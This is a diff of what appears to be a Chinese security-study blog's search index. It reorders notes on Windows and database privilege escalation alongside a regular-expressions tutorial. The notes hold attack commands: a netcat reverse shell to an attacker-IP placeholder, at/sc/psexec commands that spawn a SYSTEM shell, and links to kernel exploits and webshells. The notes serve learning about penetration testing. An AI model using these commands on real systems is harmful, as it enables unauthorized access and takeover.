@@ -3227,72 +3227,6 @@ nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
       </tags>
   </entry>
   <entry>
-    <title>Redis&amp;Postgre</title>
-    <url>/2022/03/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Redis&amp;Postgre/</url>
-    <content><![CDATA[<p><img src="/2022/03/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Redis&Postgre/image-20220303221213861.png" alt="image-20220303221213861"></p>
-<p><img src="/2022/03/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Redis&Postgre/image-20220303232856998.png" alt="image-20220303232856998"></p>
-<p><a href="https://www.jianshu.com/p/fd7b422d5f93">简述关系型数据库和非关系型数据库</a></p>
-<p><a href="https://blog.csdn.net/fly_hps/article/details/80937837">Redis未授权访问漏洞利用总结</a></p>
-<p><a href="https://vulhub.org/#/environments/postgres/CVE-2018-1058/">https://vulhub.org/#/environments/postgres/CVE-2018-1058/</a></p>
-<p><a href="https://vulhub.org/#/environments/postgres/CVE-2019-9193/">https://vulhub.org/#/environments/postgres/CVE-2019-9193/</a></p>
-]]></content>
-      <categories>
-        <category>权限提升</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>提权</tag>
-        <tag>数据库提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Win溢出漏洞及AT&amp;SC&amp;PS提权</title>
-    <url>/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&amp;SC&amp;PS%E6%8F%90%E6%9D%83/</url>
-    <content><![CDATA[<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220228235230607.png" alt="image-20220228235230607"></p>
-<h2 id="知识必备点"><a href="#知识必备点" class="headerlink" title="知识必备点"></a>知识必备点</h2><p>用户及用户组权限划分</p>
-<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220228235812582.png" alt="image-20220228235812582"></p>
-<p>Windows提权命令</p>
-<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220228235539073.png" alt="image-20220228235539073"></p>
-<h2 id="如何判断哪种溢出漏洞，漏洞哪里找"><a href="#如何判断哪种溢出漏洞，漏洞哪里找" class="headerlink" title="如何判断哪种溢出漏洞，漏洞哪里找"></a>如何判断哪种溢出漏洞，漏洞哪里找</h2><p>流程：信息搜集-&gt;补丁筛选-&gt;利用msf或特定exp执行-&gt;提权成功</p>
-<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>一开始使用systeminfo查看当前系统信息，获取补丁编号</p>
-<h3 id="补丁筛选"><a href="#补丁筛选" class="headerlink" title="补丁筛选"></a>补丁筛选</h3><p>vulmap，Wes，WindowsVulnScan工具（后两个好用）</p>
-<p>对于vulmap来说，web很难能执行.ps1文件，所以webshell实用性不佳</p>
-<p>Wes和WindowsVulnScan，本质是比较windows系统版本、systeminfo补丁信息来查看漏洞利用情况。</p>
-<p>这里注意WindowsVulnScan， 也需要执行一个.sp1的文件，但这个文件其实也就是和systeminfo做的相同的工作，只是生成了一个KB.json文件，我们可以自行在webshell里执行systeminfo然后改成和KB.json里一样的格式，然后在本机用该工具对改好的KB.json扫描，若扫描时报错可能是KB.json文件编码有问题，需要改成UTF-8</p>
-<p><a href="https://www.cnblogs.com/bonelee/p/15863223.html">WindowsVulnScan和Wes用法</a></p>
-<p>wes检测语句：python wes.py systeminfo.txt -o vuln.csv</p>
-<p>根据vuln.csv中获取exp链接地址</p>
-<h2 id="AT-amp-SC-amp-PS提权"><a href="#AT-amp-SC-amp-PS提权" class="headerlink" title="AT&amp;SC&amp;PS提权"></a>AT&amp;SC&amp;PS提权</h2><h3 id="at提权"><a href="#at提权" class="headerlink" title="at提权"></a>at提权</h3><p>适用版本：Win2000 &amp; Win2003 &amp; XP中还是存在的，在Win7以后被剔除</p>
-<p>payload：<code>at (时间) /interactive cmd.exe</code></p>
-<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220301235011222.png" alt="image-20220301235011222"></p>
-<h3 id="sc提权"><a href="#sc提权" class="headerlink" title="sc提权"></a>sc提权</h3><p>win2003测试成功,win7未测试成功</p>
-<p>创建一个名叫syscmd的新的交互式的cmd执行服务</p>
-<p><code>sc Create syscmdd binPath= &quot;cmd /K start&quot; type= own type= interact</code></p>
-<p>运行服务</p>
-<p><code>sc start syscmdd</code></p>
-<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220301235056001.png" alt="image-20220301235056001"></p>
-<h3 id="PS提权"><a href="#PS提权" class="headerlink" title="PS提权"></a>PS提权</h3><p>适用版本：<code>Win2003 &amp; Win2008</code></p>
-<p>需要下载PsTools（windows官方软件不会被杀）</p>
-<p>payload：<code>psexec.exe -accepteula -s -i -d cmd.exe</code></p>
-<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><a href="https://github.com/vulmon/Vulmap">https://github.com/vulmon/Vulmap</a></p>
-<p><a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p>
-<p><a href="https://github.com/chroblert/WindowsVulnScan">https://github.com/chroblert/WindowsVulnScan</a></p>
-<p>win内核漏洞exp收录：<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
-<p><a href="https://www.shuzhiduo.com/A/A7zgDNYKJ4/">云服务器上安装msf以及msf初体验</a></p>
-<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>
-<p><a href="https://github.com/unamer/CVE-2018-8120">https://github.com/unamer/CVE-2018-8120</a></p>
-<p><a href="https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWs-VERSION/releases/tag/1">CVE-2020-0787-EXP-ALL-WINDOWS-VERSION</a></p>
-]]></content>
-      <categories>
-        <category>权限提升</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>提权</tag>
-        <tag>win</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>MY&amp;MS&amp;ORA等数据库提权</title>
     <url>/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&amp;MS&amp;ORA%E7%AD%89%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</url>
     <content><![CDATA[<p>在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权，但需要知道数据库提权的前提条件：服务器开启数据库服务及获取到最高权限用户密码。除Access数据库外，其他数据库基本都存在数据库提权的可能。</p>
@@ -3390,6 +3324,72 @@ nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
       </tags>
   </entry>
   <entry>
+    <title>Redis&amp;Postgre</title>
+    <url>/2022/03/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Redis&amp;Postgre/</url>
+    <content><![CDATA[<p><img src="/2022/03/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Redis&Postgre/image-20220303221213861.png" alt="image-20220303221213861"></p>
+<p><img src="/2022/03/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Redis&Postgre/image-20220303232856998.png" alt="image-20220303232856998"></p>
+<p><a href="https://www.jianshu.com/p/fd7b422d5f93">简述关系型数据库和非关系型数据库</a></p>
+<p><a href="https://blog.csdn.net/fly_hps/article/details/80937837">Redis未授权访问漏洞利用总结</a></p>
+<p><a href="https://vulhub.org/#/environments/postgres/CVE-2018-1058/">https://vulhub.org/#/environments/postgres/CVE-2018-1058/</a></p>
+<p><a href="https://vulhub.org/#/environments/postgres/CVE-2019-9193/">https://vulhub.org/#/environments/postgres/CVE-2019-9193/</a></p>
+]]></content>
+      <categories>
+        <category>权限提升</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>提权</tag>
+        <tag>数据库提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Win溢出漏洞及AT&amp;SC&amp;PS提权</title>
+    <url>/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&amp;SC&amp;PS%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220228235230607.png" alt="image-20220228235230607"></p>
+<h2 id="知识必备点"><a href="#知识必备点" class="headerlink" title="知识必备点"></a>知识必备点</h2><p>用户及用户组权限划分</p>
+<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220228235812582.png" alt="image-20220228235812582"></p>
+<p>Windows提权命令</p>
+<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220228235539073.png" alt="image-20220228235539073"></p>
+<h2 id="如何判断哪种溢出漏洞，漏洞哪里找"><a href="#如何判断哪种溢出漏洞，漏洞哪里找" class="headerlink" title="如何判断哪种溢出漏洞，漏洞哪里找"></a>如何判断哪种溢出漏洞，漏洞哪里找</h2><p>流程：信息搜集-&gt;补丁筛选-&gt;利用msf或特定exp执行-&gt;提权成功</p>
+<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>一开始使用systeminfo查看当前系统信息，获取补丁编号</p>
+<h3 id="补丁筛选"><a href="#补丁筛选" class="headerlink" title="补丁筛选"></a>补丁筛选</h3><p>vulmap，Wes，WindowsVulnScan工具（后两个好用）</p>
+<p>对于vulmap来说，web很难能执行.ps1文件，所以webshell实用性不佳</p>
+<p>Wes和WindowsVulnScan，本质是比较windows系统版本、systeminfo补丁信息来查看漏洞利用情况。</p>
+<p>这里注意WindowsVulnScan， 也需要执行一个.sp1的文件，但这个文件其实也就是和systeminfo做的相同的工作，只是生成了一个KB.json文件，我们可以自行在webshell里执行systeminfo然后改成和KB.json里一样的格式，然后在本机用该工具对改好的KB.json扫描，若扫描时报错可能是KB.json文件编码有问题，需要改成UTF-8</p>
+<p><a href="https://www.cnblogs.com/bonelee/p/15863223.html">WindowsVulnScan和Wes用法</a></p>
+<p>wes检测语句：python wes.py systeminfo.txt -o vuln.csv</p>
+<p>根据vuln.csv中获取exp链接地址</p>
+<h2 id="AT-amp-SC-amp-PS提权"><a href="#AT-amp-SC-amp-PS提权" class="headerlink" title="AT&amp;SC&amp;PS提权"></a>AT&amp;SC&amp;PS提权</h2><h3 id="at提权"><a href="#at提权" class="headerlink" title="at提权"></a>at提权</h3><p>适用版本：Win2000 &amp; Win2003 &amp; XP中还是存在的，在Win7以后被剔除</p>
+<p>payload：<code>at (时间) /interactive cmd.exe</code></p>
+<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220301235011222.png" alt="image-20220301235011222"></p>
+<h3 id="sc提权"><a href="#sc提权" class="headerlink" title="sc提权"></a>sc提权</h3><p>win2003测试成功,win7未测试成功</p>
+<p>创建一个名叫syscmd的新的交互式的cmd执行服务</p>
+<p><code>sc Create syscmdd binPath= &quot;cmd /K start&quot; type= own type= interact</code></p>
+<p>运行服务</p>
+<p><code>sc start syscmdd</code></p>
+<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220301235056001.png" alt="image-20220301235056001"></p>
+<h3 id="PS提权"><a href="#PS提权" class="headerlink" title="PS提权"></a>PS提权</h3><p>适用版本：<code>Win2003 &amp; Win2008</code></p>
+<p>需要下载PsTools（windows官方软件不会被杀）</p>
+<p>payload：<code>psexec.exe -accepteula -s -i -d cmd.exe</code></p>
+<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><a href="https://github.com/vulmon/Vulmap">https://github.com/vulmon/Vulmap</a></p>
+<p><a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p>
+<p><a href="https://github.com/chroblert/WindowsVulnScan">https://github.com/chroblert/WindowsVulnScan</a></p>
+<p>win内核漏洞exp收录：<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+<p><a href="https://www.shuzhiduo.com/A/A7zgDNYKJ4/">云服务器上安装msf以及msf初体验</a></p>
+<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>
+<p><a href="https://github.com/unamer/CVE-2018-8120">https://github.com/unamer/CVE-2018-8120</a></p>
+<p><a href="https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWs-VERSION/releases/tag/1">CVE-2020-0787-EXP-ALL-WINDOWS-VERSION</a></p>
+]]></content>
+      <categories>
+        <category>权限提升</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>提权</tag>
+        <tag>win</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>令牌窃取&amp;进程注入</title>
     <url>/2022/03/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96&amp;%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h2 id="Windows2008-amp-7令牌窃取-本地"><a href="#Windows2008-amp-7令牌窃取-本地" class="headerlink" title="Windows2008&amp;7令牌窃取-本地"></a>Windows2008&amp;7令牌窃取-本地</h2><p><a href="https://cloud.tencent.com/developer/article/1752172">Windows - 令牌窃取原理及利用</a>这篇文章讲的窃取令牌并不是提权，因为低权限用户只能窃取当前用户本身</p>
@@ -3404,6 +3404,93 @@ nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
         <tag>提权</tag>
         <tag>本地提权</tag>
         <tag>win提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>烂土豆&amp;dll劫持&amp;引号路径&amp;服务权限</title>
+    <url>/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%83%82%E5%9C%9F%E8%B1%86&amp;dll%E5%8A%AB%E6%8C%81&amp;%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84&amp;%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/</url>
+    <content><![CDATA[<h2 id="烂土豆配合令牌窃取"><a href="#烂土豆配合令牌窃取" class="headerlink" title="烂土豆配合令牌窃取"></a>烂土豆配合令牌窃取</h2><p>原理</p>
+<ul>
+<li>欺骗<code>“NT AUTHORITY\SYSTEM”</code>账户通过NTLM认证到控制的TCP终端</li>
+<li>对这个认证过程使用<code>中间人攻击（NTLM重放）</code>，为<code>“NT AUTHORITY\SYSTEM”</code>账户本地协商一个安全令牌。这个过程通过一系列的Windows API调用实现的。</li>
+<li>模仿这个令牌。只有具有“<code>模仿安全令牌权限</code>”的账户才能去模仿别人的令牌。一般大多数服务型账户（IIS、MSSQL等）都有这个权限，用户级账户大多数没有这个权限。</li>
+</ul>
+<blockquote>
+<p>一般从Web拿到的WebShell 都是IIS 服务器权限，是具有这个模仿权限，使用菜刀反弹meterpreter就会成功</p>
+</blockquote>
+<p><a href="https://www.cnblogs.com/encr/p/15206787.html">烂土豆提权-win7复现</a></p>
+<p><a href="https://github.com/tennc/webshell">GitHub - tennc/webshell: This is a webshell open source project</a></p>
+<h2 id="dll劫持"><a href="#dll劫持" class="headerlink" title="dll劫持"></a>dll劫持</h2><p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%83%82%E5%9C%9F%E8%B1%86&dll%E5%8A%AB%E6%8C%81&%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84&%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20220304123233025.png" alt="image-20220304123233025"></p>
+<p>使用火绒剑程序分析非系统文件加载的dll，尝试替换</p>
+<h2 id="不带引号的服务路径提权"><a href="#不带引号的服务路径提权" class="headerlink" title="不带引号的服务路径提权"></a>不带引号的服务路径提权</h2><p><a href="https://blog.csdn.net/weixin_44032232/article/details/109073666">https://blog.csdn.net/weixin_44032232/article/details/109073666</a></p>
+<h2 id="服务权限"><a href="#服务权限" class="headerlink" title="服务权限"></a>服务权限</h2><p>AccessChk v6.14下载：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk - Windows Sysinternals | Microsoft Docs</a></p>
+<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%83%82%E5%9C%9F%E8%B1%86&dll%E5%8A%AB%E6%8C%81&%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84&%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20220304130726700.png" alt="image-20220304130726700"></p>
+]]></content>
+      <categories>
+        <category>权限提升</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>提权</tag>
+        <tag>win提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>正则表达式</title>
+    <url>/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
+    <content><![CDATA[<blockquote>
+<p>正则在线测试网站：<a href="https://regexr-cn.com/">https://regexr-cn.com</a></p>
+<p>正则练习平台：<a href="https://www.codejiaonang.com/#/course/regex_chapter1/0/0">https://www.codejiaonang.com/#/course/regex_chapter1/0/0</a></p>
+</blockquote>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220124154750051.png" alt="image-20220124154750051"></p>
+<h3 id="字符集：匹配集合中的任何字符"><a href="#字符集：匹配集合中的任何字符" class="headerlink" title="[]字符集：匹配集合中的任何字符"></a><code>[]</code>字符集：匹配集合中的任何字符</h3><ul>
+<li><p><code>-</code>表示区间，例如：<code>[a-z]</code>表示小写字母a到z</p>
+</li>
+<li><p><code>\</code>转义特殊字符，<code>[\]]</code>表示匹配<code>]</code></p>
+</li>
+<li><p><code>^</code>表示取非，<code>[^]</code>称作非集，匹配不在集合中的任何字符，例如<code>我[^你]</code>匹配我字后面没有你字（匹配两个字）</p>
+</li>
+</ul>
+<h3 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h3><p><code>\d</code>数字，匹配任意数字(0-9)</p>
+<p><code>\w</code>单词，匹配字母、数字、下划线</p>
+<p><code>\s</code>空白字符，匹配任何空白字符。(空格，制表符tab，换行符)</p>
+<p><code>\b</code>词边界，匹配一个单词边界，也就是指单词和空格见的位置，成对使用，例如<code>\bawesome\b</code>，匹配完整的单词，前后不能有其他字母，否则将匹配失败</p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125125138035.png" alt="image-20220125125138035"></p>
+<p>快捷方式取非，将上述<code>dwsb</code>等字母，换成大写即可</p>
+<h3 id="开头和结尾"><a href="#开头和结尾" class="headerlink" title="开头和结尾"></a>开头和结尾</h3><p><code>^</code>开头，匹配字符串开头，或者当使用多行标志时，匹配一行的开头</p>
+<p><code>$</code>结尾，匹配字符串结尾，或者当使用多行标志时，匹配一行的结尾</p>
+<p>例如<code>^abcd</code>会匹配<code>abcdefg</code>中的<code>abcd</code>，<code>efg$</code>会匹配<code>abcdefg</code>中的<code>efg</code></p>
+<h3 id="任意字符"><a href="#任意字符" class="headerlink" title="任意字符"></a>任意字符</h3><p><code>.</code>，匹配任何字符(不包括换行)</p>
+<h3 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h3><p><code>?</code>，匹配在0和1之间个前面的标记，例如<code>favou?r</code>，匹配的时favour和favor</p>
+<p><code>&#123;n&#125;</code>，匹配n个前面的标记，例如<code>\d&#123;10&#125;</code>，匹配连续10个数字</p>
+<p><code>&#123;n,m&#125;</code><strong>贪婪模式</strong>，匹配n到m个前面的标记，有连续的m个就会匹配m个</p>
+<p><code>&#123;n,m&#125;?</code><strong>非贪婪模式</strong>，只会匹配到连续的n个就停止匹配，例如下图</p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220124234228787.png" alt="image-20220124234228787"></p>
+<p><code>*</code>，匹配0个或更多个前面的标记，例如<code>f.*</code>，会匹配所有f开头的字符</p>
+<p><code>+</code>，匹配1个或更多个前面的标记，例如<code>f.+</code>，会匹配所有f开头的字符，但不匹配单独的f</p>
+<h3 id="分组提取"><a href="#分组提取" class="headerlink" title="分组提取"></a>分组提取</h3><p><code>()</code>捕获分组，把多个标记分在同一组并创建一个捕获分组，用来创建子串或引用</p>
+<p><code>|</code>或者条件</p>
+<p><code>(?:表达式)</code>非捕获分组，在不创建捕获分组的情况下，把数个标记组在一起</p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125164458925.png" alt="image-20220125164458925"></p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125173535988.png" alt="image-20220125173535988"></p>
+<p><code>(表达式)\1</code>分组的回溯引用，<code>\1</code>的效果是重新使用第1个分组去匹配，例如<code>(\w)(\w)\2\1</code>，匹配abba这种类型的字符，<strong>注：只有<code>()</code>有效，<code>(?:)</code>等无效</strong></p>
+<h3 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h3><p>可以理解为预搜索，可对字符串做限制要求</p>
+<h4 id="先行（表示从某个位置向右看）"><a href="#先行（表示从某个位置向右看）" class="headerlink" title="先行（表示从某个位置向右看）"></a>先行（表示从某个位置向右看）</h4><p><code>(?=)</code><strong>正向</strong>先行断言，匹配主表达式后面的组而不将其包含在结果中（保证右边含有某字符）</p>
+<p><strong>可以翻译为：(?=表达式)右边存在</strong></p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125175109411.png" alt="image-20220125175109411"></p>
+<p><code>(?!)</code><strong>反向</strong>先行断言,指定著表达式后无法匹配的组，若匹配结果将被丢弃（保证右边不出现某字符）</p>
+<p><strong>可以翻译为：(?!表达式)右边不存在</strong></p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125181138445.png" alt="image-20220125181138445"></p>
+<p>tips：正向是<code>=</code>，反向是<code>!</code>，也即正向是<strong>有</strong>，反向是<strong>没有</strong></p>
+<h4 id="后行-表示从某个位置向左看"><a href="#后行-表示从某个位置向左看" class="headerlink" title="后行(表示从某个位置向左看)"></a>后行(表示从某个位置向左看)</h4><p><code>(?&lt;=)</code><strong>正向</strong>后行断言，匹配主表达式之前的组，而不将其包含在结果中</p>
+<p><strong>可以翻译为：(?&lt;=表达式)左边存在</strong></p>
+<p><code>(?&lt;!)</code><strong>反向</strong>后行断言，指定在主表达式之前无法匹配的组，如果匹配，则结果将被丢弃</p>
+<p><strong>可以翻译为：(?&lt;!表达式)左边不存在</strong></p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125181836600.png" alt="image-20220125181836600"></p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125183732972.png" alt="image-20220125183732972"></p>
+]]></content>
+      <tags>
+        <tag>正则表达式</tag>
       </tags>
   </entry>
   <entry>
@@ -3497,93 +3584,6 @@ nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
       </categories>
       <tags>
         <tag>社会工程学，钓鱼</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>烂土豆&amp;dll劫持&amp;引号路径&amp;服务权限</title>
-    <url>/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%83%82%E5%9C%9F%E8%B1%86&amp;dll%E5%8A%AB%E6%8C%81&amp;%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84&amp;%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/</url>
-    <content><![CDATA[<h2 id="烂土豆配合令牌窃取"><a href="#烂土豆配合令牌窃取" class="headerlink" title="烂土豆配合令牌窃取"></a>烂土豆配合令牌窃取</h2><p>原理</p>
-<ul>
-<li>欺骗<code>“NT AUTHORITY\SYSTEM”</code>账户通过NTLM认证到控制的TCP终端</li>
-<li>对这个认证过程使用<code>中间人攻击（NTLM重放）</code>，为<code>“NT AUTHORITY\SYSTEM”</code>账户本地协商一个安全令牌。这个过程通过一系列的Windows API调用实现的。</li>
-<li>模仿这个令牌。只有具有“<code>模仿安全令牌权限</code>”的账户才能去模仿别人的令牌。一般大多数服务型账户（IIS、MSSQL等）都有这个权限，用户级账户大多数没有这个权限。</li>
-</ul>
-<blockquote>
-<p>一般从Web拿到的WebShell 都是IIS 服务器权限，是具有这个模仿权限，使用菜刀反弹meterpreter就会成功</p>
-</blockquote>
-<p><a href="https://www.cnblogs.com/encr/p/15206787.html">烂土豆提权-win7复现</a></p>
-<p><a href="https://github.com/tennc/webshell">GitHub - tennc/webshell: This is a webshell open source project</a></p>
-<h2 id="dll劫持"><a href="#dll劫持" class="headerlink" title="dll劫持"></a>dll劫持</h2><p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%83%82%E5%9C%9F%E8%B1%86&dll%E5%8A%AB%E6%8C%81&%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84&%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20220304123233025.png" alt="image-20220304123233025"></p>
-<p>使用火绒剑程序分析非系统文件加载的dll，尝试替换</p>
-<h2 id="不带引号的服务路径提权"><a href="#不带引号的服务路径提权" class="headerlink" title="不带引号的服务路径提权"></a>不带引号的服务路径提权</h2><p><a href="https://blog.csdn.net/weixin_44032232/article/details/109073666">https://blog.csdn.net/weixin_44032232/article/details/109073666</a></p>
-<h2 id="服务权限"><a href="#服务权限" class="headerlink" title="服务权限"></a>服务权限</h2><p>AccessChk v6.14下载：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk - Windows Sysinternals | Microsoft Docs</a></p>
-<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%83%82%E5%9C%9F%E8%B1%86&dll%E5%8A%AB%E6%8C%81&%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84&%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20220304130726700.png" alt="image-20220304130726700"></p>
-]]></content>
-      <categories>
-        <category>权限提升</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>提权</tag>
-        <tag>win提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>正则表达式</title>
-    <url>/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
-    <content><![CDATA[<blockquote>
-<p>正则在线测试网站：<a href="https://regexr-cn.com/">https://regexr-cn.com</a></p>
-<p>正则练习平台：<a href="https://www.codejiaonang.com/#/course/regex_chapter1/0/0">https://www.codejiaonang.com/#/course/regex_chapter1/0/0</a></p>
-</blockquote>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220124154750051.png" alt="image-20220124154750051"></p>
-<h3 id="字符集：匹配集合中的任何字符"><a href="#字符集：匹配集合中的任何字符" class="headerlink" title="[]字符集：匹配集合中的任何字符"></a><code>[]</code>字符集：匹配集合中的任何字符</h3><ul>
-<li><p><code>-</code>表示区间，例如：<code>[a-z]</code>表示小写字母a到z</p>
-</li>
-<li><p><code>\</code>转义特殊字符，<code>[\]]</code>表示匹配<code>]</code></p>
-</li>
-<li><p><code>^</code>表示取非，<code>[^]</code>称作非集，匹配不在集合中的任何字符，例如<code>我[^你]</code>匹配我字后面没有你字（匹配两个字）</p>
-</li>
-</ul>
